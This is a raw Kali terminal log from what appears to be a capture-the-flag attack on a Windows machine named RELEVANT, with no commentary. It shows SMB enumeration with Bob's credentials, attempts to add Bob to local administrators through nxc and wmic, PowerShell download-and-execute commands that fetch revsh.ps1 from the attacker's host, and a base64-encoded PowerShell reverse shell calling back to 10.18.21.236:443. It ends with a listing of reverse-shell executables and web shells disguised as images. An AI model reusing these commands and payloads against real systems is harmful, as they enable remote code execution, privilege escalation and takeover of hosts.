
How, testing a lot of random stuff

```sh
┌──(kali㉿kali)-[~]
└─$ nxc smb relevant.thm -u 'Bob' -p '!P@$$W0rD!123' --shares
SMB         10.10.112.35    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.112.35    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
SMB         10.10.112.35    445    RELEVANT         [*] Enumerated shares
SMB         10.10.112.35    445    RELEVANT         Share           Permissions     Remark
SMB         10.10.112.35    445    RELEVANT         -----           -----------     ------
SMB         10.10.112.35    445    RELEVANT         ADMIN$                          Remote Admin
SMB         10.10.112.35    445    RELEVANT         C$                              Default share
SMB         10.10.112.35    445    RELEVANT         IPC$                            Remote IPC
SMB         10.10.112.35    445    RELEVANT         nt4wrksv        READ,WRITE      
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ xfreerdp /dynamic-resolution /scale:140 +clipboard /cert:ignore /v:relevant.thm /u:Bob /p:'!P@$$W0rD!123'
[15:46:57:523] [273655:273656] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer
[15:46:57:523] [273655:273656] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[15:46:57:016] [273655:273656] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer
[15:46:57:016] [273655:273656] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[15:46:57:016] [273655:273656] [ERROR][com.freerdp.core] - freerdp_post_connect failed
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nxc smb relevant.thm -u 'Bob' -p '!P@$$W0rD!123' -x "net localgroup administrators Bob /add"             
SMB         10.10.112.35    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.112.35    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nxc smb relevant.thm -u 'Bob' -p '!P@$$W0rD!123' -X "net localgroup administrators Bob /add"
SMB         10.10.112.35    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.112.35    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nxc smb relevant.thm -u 'Bob' -p '!P@$$W0rD!123' -X "jdlkfjhaölfjhg"                        
SMB         10.10.112.35    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.112.35    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nxc smb relevant.thm -u 'Bob' -p '!P@$$W0rD!123' -X "whoami"        
SMB         10.10.112.35    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.112.35    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nxc smb relevant.thm -u 'Bob' -p '!P@$$W0rD!123' -x 'powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://10.18.21.236:8000/shells/revsh.ps1');"'   
SMB         10.10.112.35    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.112.35    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nxc smb relevant.thm -u 'Bob' -p '!P@$$W0rD!123' -x 'powershell.exe -c "IEX [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTAuMTguMjEuMjM2Jyw0NDMpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK'));"'
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i relevant.thm -u 'Bob' -p '!P@$$W0rD!123'     
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                     
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
^C
                                        
Warning: Press "y" to exit, press any other key to continue
                                        
Info: Exiting...
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i relevant.thm -u 'Bob' -p '!P@$$W0rD!123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                     
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type HTTPClient::ConnectTimeoutError happened, message is execution expired
                                        
Error: Exiting with code 1
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i relevant.thm -u 'Bob' -p '!P@$$W0rD!123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                     
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type HTTPClient::ConnectTimeoutError happened, message is execution expired
                                        
Error: Exiting with code 1
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nxc smb relevant.thm -u 'Bob' -p '!P@$$W0rD!123' -x 'powershell.exe -c "IEX [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTAuMTguMjEuMjM2Jyw0NDMpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK'));"'
SMB         10.10.84.243    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.84.243    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nxc smb relevant.thm -u 'Bob' -p '!P@$$W0rD!123' -x 'iwr http://10.18.21.236:8000/shells/revsh2.ps'                   
SMB         10.10.84.243    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.84.243    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ ls -la shells                                
total 1604
drwxr-xr-x  2 kali kali   4096 Jul 25 16:32 .
drwx------ 51 kali kali   4096 Jul 25 16:40 ..
-rw-r--r--  1 kali kali   4338 Jun  6 17:23 Invoke-PowerShellTcp.ps1
-rw-r--r--  1 kali kali 178882 Apr  4 20:42 cat.jpg
-rw-------  1 kali kali     39 Dec  9  2023 cmd.php
-rw-r--r--  1 kali kali    439 Dec  9  2023 cthulu-rev.ps1
-rw-r--r--  1 kali kali    439 Dec  9  2023 cthulu-rev444.ps1
-rw-r--r--  1 kali kali 135430 Apr  4 20:42 dog.jpg
-rw-r--r--  1 kali kali 149820 Apr  4 20:42 flower.gif
-rw-r--r--  1 kali kali   4993 Apr  1 12:13 jsgen.py
-rw-rw-r--  1 kali kali    136 Jun 17 14:20 mksudo-www-data.sh
-rw-r--r--  1 kali kali   9292 Apr 16 16:21 php-reverse-shell-win.php
-rw-r--r--  1 kali kali   5490 Feb 11 02:37 php-reverse-shell.php
-rw-r--r--  1 kali kali   5490 Apr 25 23:03 php-reverse-shell.php.htb.jpg
-rw-r--r--  1 kali kali   5490 Apr 25 22:58 php-reverse-shell.php.htm.jpg
-rw-r--r--  1 kali kali   5490 Apr 19 19:09 php-reverse-shell.phtml
-rw-r--r--  1 kali kali   5488 Feb 11 02:24 php-reverse-shell.png
-rw-r--r--  1 kali kali 705442 Apr  4 20:42 purple.jpg
-rw-r--r--  1 kali kali  73802 Jun  7 20:58 revsh-443.exe
-rw-r--r--  1 kali kali  73802 Jun  7 21:19 revsh-444.exe
-rw-r--r--  1 kali kali  73802 Jun  6 18:28 revsh-meterpr-444.exe
-rw-r--r--  1 kali kali   7168 Apr 16 17:19 revsh-meterpr.exe
-rw-r--r--  1 kali kali    462 Jan 25 19:43 revsh-old.ps1
-rw-r--r--  1 kali kali  15872 Apr 22 11:50 revsh-win-x86-service.exe
-rw-r--r--  1 kali kali    562 Jun  6 16:58 revsh.groovy
-rw-r--r--  1 kali kali    382 Apr  1 14:21 revsh.jpg
-rw-r--r--  1 kali kali    387 Apr  1 12:38 revsh.jpg.js
-rw-r--r--  1 kali kali     92 Apr  1 14:00 revsh.jpg2.js
-rw-r--r--  1 kali kali    382 Apr  1 12:28 revsh.js
-rw-r--r--  1 kali kali   3512 Mar  3 17:02 revsh.php
-rw-------  1 kali kali    442 Jan 25 19:45 revsh.ps1
-rw-r--r--  1 kali kali    501 Jun  6 16:31 revsh2.ps1
-rw-rw-r--  1 kali kali    669 Jul 25 16:32 revsh2.ps1.bas64
-rw-rw-r--  1 kali kali    152 Jun 14 17:29 revsh444-32.elf
-rw-rw-r--  1 kali kali    194 Jun 14 17:03 revsh444.elf
-rw-r--r--  1 kali kali    194 Apr 18 16:39 revsh64.elf
-rw-r--r--  1 kali kali    439 Mar 29 18:48 revshk.ps1
-rw-r--r--  1 kali kali   3519 Mar 27 09:45 shell.gif.php
-rw-r--r--  1 kali kali   3517 Mar 27 09:49 shell.jpg
-rw-r--r--  1 kali kali   3517 Mar 27 09:45 shell.jpg.php
-rw-r--r--  1 kali kali   3517 Apr  1 09:46 shell.jpg.whatever
-rw-r--r--  1 kali kali   3517 Apr  4 21:11 shell.php.jpg
-rw-r--r--  1 kali kali   3512 Mar 21 15:44 shell.php5
-rw-r--r--  1 kali kali   3521 Mar 27 09:46 shell.png.php
-rw-rw-r--  1 kali kali     67 Jun 17 14:57 test.sh
-rw-r--r--  1 kali kali     49 Jul  5 14:07 webshell.jpg.php
-rw-r--r--  1 kali kali     44 Apr 16 17:38 webshell.php
-rw-r--r--  1 kali kali   7168 Dec 11  2023 win64_reverse.exe
-rw-r--r--  1 kali kali   2823 May 22 20:51 wordpress-webshell-plugin.php
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nxc smb relevant.thm -u 'Bob' -p '!P@$$W0rD!123' -x 'iwr http://10.18.21.236:8000/shells/revsh2.ps1'
SMB         10.10.84.243    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.84.243    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nxc smb relevant.thm -u 'Bob' -p '!P@$$W0rD!123' -X 'iwr http://10.18.21.236:8000/shells/revsh2.ps1'
SMB         10.10.84.243    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.84.243    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nxc smb relevant.thm -u 'Bob' -p '!P@$$W0rD!123' -x 'powershell.exe -c "iwr http://10.18.21.236:8000/shells/revsh2.ps1"' 
SMB         10.10.84.243    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.84.243    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ wmic                           
Command 'wmic' not found, but can be installed with:
sudo apt install wmi-client
Do you want to install it? (N/y)y
sudo apt install wmi-client
[sudo] password for kali: 
The following package was automatically installed and is no longer required:
  libjxl0.8
Use 'sudo apt autoremove' to remove it.

Installing:
  wmi-client
                                                                                                                              
Summary:
  Upgrading: 0, Installing: 1, Removing: 0, Not Upgrading: 125
  Download size: 1519 kB
  Space needed: 9508 kB / 11.4 GB available

Get:1 http://mirror.accum.se/mirror/kali.org/kali kali-rolling/main amd64 wmi-client amd64 1.3.16-0kali8 [1519 kB]
Fetched 1519 kB in 0s (3235 kB/s)   
Selecting previously unselected package wmi-client.
(Reading database ... 482246 files and directories currently installed.)
Preparing to unpack .../wmi-client_1.3.16-0kali8_amd64.deb ...
Unpacking wmi-client (1.3.16-0kali8) ...
Setting up wmi-client (1.3.16-0kali8) ...
Processing triggers for kali-menu (2023.4.7) ...
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ wmic
Usage: [-?|--help] [--usage] [-d|--debuglevel DEBUGLEVEL] [--debug-stderr]
        [-s|--configfile CONFIGFILE] [--option=name=value]
        [-l|--log-basename LOGFILEBASE] [--leak-report] [--leak-report-full]
        [-R|--name-resolve NAME-RESOLVE-ORDER]
        [-O|--socket-options SOCKETOPTIONS] [-n|--netbiosname NETBIOSNAME]
        [-W|--workgroup WORKGROUP] [--realm=REALM] [-i|--scope SCOPE]
        [-m|--maxprotocol MAXPROTOCOL] [-U|--user [DOMAIN\]USERNAME[%PASSWORD]]
        [-N|--no-pass] [--password=STRING] [-A|--authentication-file FILE]
        [-S|--signing on|off|required] [-P|--machine-pass]
        [--simple-bind-dn=STRING] [-k|--kerberos STRING]
        [--use-security-mechanisms=STRING] [-V|--version] [--namespace=STRING]
        [--delimiter=STRING]
        //host query

Example: wmic -U [domain/]adminuser%password //host "select * from Win32_ComputerSystem"
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ wmic -U 'Bob'%'!P@$$W0rD!123' //10.10.84.243 "process call create 'cmd.exe /c net localgroup administrators Bob /add'"   
[wmi/wmic.c:196:main()] ERROR: Login to remote object.
NTSTATUS: NT_STATUS_ACCESS_DENIED - Access denied
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ wmic --help                                                                                                           
Usage: //host query

Example: wmic -U [domain/]adminuser%password //host "select * from Win32_ComputerSystem"
  --namespace=STRING                          WMI namespace, default to
                                              root\cimv2
  --delimiter=STRING                          delimiter to use when querying
                                              multiple values, default to '|'

Help options:
  -?, --help                                  Show this help message
  --usage                                     Display brief usage message

Common samba options:
  -d, --debuglevel=DEBUGLEVEL                 Set debug level
  --debug-stderr                              Send debug output to STDERR
  -s, --configfile=CONFIGFILE                 Use alternative configuration
                                              file
  --option=name=value                         Set smb.conf option from command
                                              line
  -l, --log-basename=LOGFILEBASE              Basename for log/debug files
  --leak-report                               enable talloc leak reporting on
                                              exit
  --leak-report-full                          enable full talloc leak
                                              reporting on exit

Connection options:
  -R, --name-resolve=NAME-RESOLVE-ORDER       Use these name resolution
                                              services only
  -O, --socket-options=SOCKETOPTIONS          socket options to use
  -n, --netbiosname=NETBIOSNAME               Primary netbios name
  -W, --workgroup=WORKGROUP                   Set the workgroup name
  --realm=REALM                               Set the realm name
  -i, --scope=SCOPE                           Use this Netbios scope
  -m, --maxprotocol=MAXPROTOCOL               Set max protocol level

Authentication options:
  -U, --user=[DOMAIN\]USERNAME[%PASSWORD]     Set the network username
  -N, --no-pass                               Don't ask for a password
  --password=STRING                           Password
  -A, --authentication-file=FILE              Get the credentials from a file
  -S, --signing=on|off|required               Set the client signing state
  -P, --machine-pass                          Use stored machine account
                                              password (implies -k)
  --simple-bind-dn=STRING                     DN to use for a simple bind
  -k, --kerberos=STRING                       Use Kerberos
  --use-security-mechanisms=STRING            Restricted list of
                                              authentication mechanisms
                                              available for use with this
                                              authentication

Common samba options:
  -V, --version                               Print version
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ wmic -U 'Bob'%'!P@$$W0rD!123' //10.10.84.243 "select * from Win32_ComputerSystem"                                     
[wmi/wmic.c:196:main()] ERROR: Login to remote object.
NTSTATUS: NT_STATUS_ACCESS_DENIED - Access denied

```
